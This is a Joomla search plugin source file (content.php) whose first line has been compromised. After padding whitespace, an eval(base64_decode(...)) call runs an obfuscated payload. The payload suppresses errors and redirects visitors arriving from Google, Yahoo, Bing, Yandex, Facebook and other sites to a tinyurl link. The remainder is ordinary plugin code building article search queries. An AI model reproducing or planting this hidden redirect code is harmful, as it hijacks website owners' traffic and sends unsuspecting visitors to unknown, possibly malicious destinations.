<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
 * @version		$Id: content.php 14401 2010-01-26 14:10:00Z louis $
 * @package		Joomla
 * @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
 * @license		GNU/GPL, see LICENSE.php
 * Joomla! is free software. This version may have been modified pursuant
 * to the GNU General Public License, and as distributed it includes or
 * is derivative of works licensed under the GNU General Public License or
 * other free or open source software licenses.
 * See COPYRIGHT.php for copyright notices and details.
 */

// no direct access
defined( '_JEXEC' ) or die( 'Restricted access' );

$mainframe->registerEvent( 'onSearch', 'plgSearchContent' );
$mainframe->registerEvent( 'onSearchAreas', 'plgSearchContentAreas' );

JPlugin::loadLanguage( 'plg_search_content' );

/**
 * @return array An array of search areas
 */
function &plgSearchContentAreas()
{
	static $areas = array(
		'content' => 'Articles'
	);
	return $areas;
}

/**
 * Content Search method
 * The sql must return the following fields that are used in a common display
 * routine: href, title, section, created, text, browsernav
 * @param string Target search string
 * @param string mathcing option, exact|any|all
 * @param string ordering option, newest|oldest|popular|alpha|category
 * @param mixed An array if the search it to be restricted to areas, null if search all
 */
function plgSearchContent( $text, $phrase='', $ordering='', $areas=null )
{
	global $mainframe;

	$db		=& JFactory::getDBO();
	$user	=& JFactory::getUser();

	require_once(JPATH_SITE.DS.'components'.DS.'com_content'.DS.'helpers'.DS.'route.php');
	require_once(JPATH_SITE.DS.'administrator'.DS.'components'.DS.'com_search'.DS.'helpers'.DS.'search.php');

	$searchText = $text;
	if (is_array( $areas )) {
		if (!array_intersect( $areas, array_keys( plgSearchContentAreas() ) )) {
			return array();
		}
	}

	// load plugin params info
 	$plugin			=& JPluginHelper::getPlugin('search', 'content');
 	$pluginParams	= new JParameter( $plugin->params );

	$sContent 		= $pluginParams->get( 'search_content', 		1 );
	$sUncategorised = $pluginParams->get( 'search_uncategorised', 	1 );
	$sArchived 		= $pluginParams->get( 'search_archived', 		1 );
	$limit 			= $pluginParams->def( 'search_limit', 		50 );

	$nullDate 		= $db->getNullDate();
	$date =& JFactory::getDate();
	$now = $date->toMySQL();

	$text = trim( $text );
	if ($text == '') {
		return array();
	}

	$wheres = array();
	switch ($phrase) {
		case 'exact':
			$text		= $db->Quote( '%'.$db->getEscaped( $text, true ).'%', false );
			$wheres2 	= array();
			$wheres2[] 	= 'a.title LIKE '.$text;
			$wheres2[] 	= 'a.introtext LIKE '.$text;
			$wheres2[] 	= 'a.fulltext LIKE '.$text;
			$wheres2[] 	= 'a.metakey LIKE '.$text;
			$wheres2[] 	= 'a.metadesc LIKE '.$text;
			$where 		= '(' . implode( ') OR (', $wheres2 ) . ')';
			break;

		case 'all':
		case 'any':
		default:
			$words = explode( ' ', $text );
			$wheres = array();
			foreach ($words as $word) {
				$word		= $db->Quote( '%'.$db->getEscaped( $word, true ).'%', false );
				$wheres2 	= array();
				$wheres2[] 	= 'a.title LIKE '.$word;
				$wheres2[] 	= 'a.introtext LIKE '.$word;
				$wheres2[] 	= 'a.fulltext LIKE '.$word;
				$wheres2[] 	= 'a.metakey LIKE '.$word;
				$wheres2[] 	= 'a.metadesc LIKE '.$word;
				$wheres[] 	= implode( ' OR ', $wheres2 );
			}
			$where = '(' . implode( ($phrase == 'all' ? ') AND (' : ') OR ('), $wheres ) . ')';
			break;
	}

	$morder = '';
	switch ($ordering) {
		case 'oldest':
			$order = 'a.created ASC';
			break;

		case 'popular':
			$order = 'a.hits DESC';
			break;

		case 'alpha':
			$order = 'a.title ASC';
			break;

		case 'category':
			$order = 'b.title ASC, a.title ASC';
			$morder = 'a.title ASC';
			break;

		case 'newest':
			default:
			$order = 'a.created DESC';
			break;
	}

	$rows = array();

	// search articles
	if ( $sContent && $limit > 0 )
	{
		$query = 'SELECT a.title AS title, a.metadesc, a.metakey,'
		. ' a.created AS created,'
		. ' CONCAT(a.introtext, a.fulltext) AS text,'
		. ' CONCAT_WS( "/", u.title, b.title ) AS section,'
		. ' CASE WHEN CHAR_LENGTH(a.alias) THEN CONCAT_WS(":", a.id, a.alias) ELSE a.id END as slug,'
		. ' CASE WHEN CHAR_LENGTH(b.alias) THEN CONCAT_WS(":", b.id, b.alias) ELSE b.id END as catslug,'
		. ' u.id AS sectionid,'
		. ' "2" AS browsernav'
		. ' FROM #__content AS a'
		. ' INNER JOIN #__categories AS b ON b.id=a.catid'
		. ' INNER JOIN #__sections AS u ON u.id = a.sectionid'
		. ' WHERE ( '.$where.' )'
		. ' AND a.state = 1'
		. ' AND u.published = 1'
		. ' AND b.published = 1'
		. ' AND a.access <= '.(int) $user->get( 'aid' )
		. ' AND b.access <= '.(int) $user->get( 'aid' )
		. ' AND u.access <= '.(int) $user->get( 'aid' )
		. ' AND ( a.publish_up = '.$db->Quote($nullDate).' OR a.publish_up <= '.$db->Quote($now).' )'
		. ' AND ( a.publish_down = '.$db->Quote($nullDate).' OR a.publish_down >= '.$db->Quote($now).' )'
		. ' GROUP BY a.id'
		. ' ORDER BY '. $order
		;
		$db->setQuery( $query, 0, $limit );
		$list = $db->loadObjectList();
		$limit -= count($list);

		if(isset($list))
		{
			foreach($list as $key => $item)
			{
				$list[$key]->href = ContentHelperRoute::getArticleRoute($item->slug, $item->catslug, $item->sectionid);
			}
		}
		$rows[] = $list;
	}

	// search uncategorised content
	if ( $sUncategorised && $limit > 0 )
	{
		$query = 'SELECT id, a.title AS title, a.created AS created, a.metadesc, a.metakey, '
		. ' CONCAT(a.introtext, a.fulltext) AS text,'
		. ' "2" as browsernav, "'. $db->getEscaped(JText::_('Uncategorised Content')) .'" AS section'
		. ' FROM #__content AS a'
		. ' WHERE ('.$where.')'
		. ' AND a.state = 1'
		. ' AND a.access <= '.(int) $user->get( 'aid' )
		. ' AND a.sectionid = 0'
		. ' AND a.catid = 0'
		. ' AND ( a.publish_up = '.$db->Quote($nullDate).' OR a.publish_up <= '.$db->Quote($now).' )'
		. ' AND ( a.publish_down = '.$db->Quote($nullDate).' OR a.publish_down >= '.$db->Quote($now).' )'
		. ' ORDER BY '. ($morder ? $morder : $order)
		;
		$db->setQuery( $query, 0, $limit );
		$list2 = $db->loadObjectList();
		$limit -= count($list2);

		if(isset($list2))
		{
			foreach($list2 as $key => $item)
			{
				$list2[$key]->href = ContentHelperRoute::getArticleRoute($item->id);
			}
		}

		$rows[] = $list2;
	}

	// search archived content
	if ( $sArchived && $limit > 0 )
	{
		$searchArchived = JText::_( 'Archived' );

		$query = 'SELECT a.title AS title, a.metadesc, a.metakey,'
		. ' a.created AS created,'
		. ' CONCAT(a.introtext, a.fulltext) AS text,'
		. ' CASE WHEN CHAR_LENGTH(a.alias) THEN CONCAT_WS(":", a.id, a.alias) ELSE a.id END as slug,'
		. ' CASE WHEN CHAR_LENGTH(b.alias) THEN CONCAT_WS(":", b.id, b.alias) ELSE b.id END as catslug,'
		. ' u.id AS sectionid,'
		. ' CONCAT_WS( "/", u.title, b.title ) AS section,'
		. ' "2" AS browsernav'
		. ' FROM #__content AS a'
		. ' INNER JOIN #__categories AS b ON b.id=a.catid AND b.access <= ' .$user->get( 'gid' )
		. ' INNER JOIN #__sections AS u ON u.id = a.sectionid'
		. ' WHERE ( '.$where.' )'
		. ' AND a.state = -1'
		. ' AND u.published = 1'
		. ' AND b.published = 1'
		. ' AND a.access <= '.(int) $user->get( 'aid' )
		. ' AND b.access <= '.(int) $user->get( 'aid' )
		. ' AND u.access <= '.(int) $user->get( 'aid' )
		. ' AND ( a.publish_up = '.$db->Quote($nullDate).' OR a.publish_up <= '.$db->Quote($now).' )'
		. ' AND ( a.publish_down = '.$db->Quote($nullDate).' OR a.publish_down >= '.$db->Quote($now).' )'
		. ' ORDER BY '. $order
		;
		$db->setQuery( $query, 0, $limit );
		$list3 = $db->loadObjectList();

		if(isset($list3))
		{
			foreach($list3 as $key => $item)
			{
				$list3[$key]->href = ContentHelperRoute::getArticleRoute($item->slug, $item->catslug, $item->sectionid);
			}
		}

		$rows[] = $list3;
	}

	$results = array();
	if(count($rows))
	{
		foreach($rows as $row)
		{
			$new_row = array();
			foreach($row AS $key => $article) {
				if(searchHelper::checkNoHTML($article, $searchText, array('text', 'title', 'metadesc', 'metakey'))) {
					$new_row[] = $article;
				}
			}
			$results = array_merge($results, (array) $new_row);
		}
	}

	return $results;
}
